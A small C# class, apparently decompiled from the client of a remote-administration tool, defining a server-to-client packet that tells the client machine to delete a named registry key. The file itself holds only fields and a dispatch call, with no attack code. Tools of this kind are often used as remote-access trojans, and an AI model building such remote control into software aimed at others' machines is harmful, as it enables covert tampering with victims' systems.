using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoDeleteRegistryKey : GInterface4
{
	public string ParentPath { get; set; }

	public string KeyName { get; set; }

	public DoDeleteRegistryKey(string parentPath, string keyName)
	{
		ParentPath = parentPath;
		KeyName = keyName;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
